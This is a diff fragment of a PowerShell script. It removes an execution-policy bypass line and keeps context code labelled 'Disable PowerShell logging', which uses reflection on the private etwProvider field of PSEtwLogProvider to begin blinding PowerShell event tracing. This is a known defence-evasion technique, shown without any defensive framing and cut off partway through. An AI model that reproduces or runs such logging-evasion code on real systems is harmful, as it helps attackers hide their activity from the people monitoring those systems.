@@ -3,9 +3,6 @@
 # Version:          1.0
 #
 
-# Bypass execution policy
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
-
 # Disable PowerShell logging
 $etw_provider = [ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider", "NonPublic,Static")
 $event_provider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
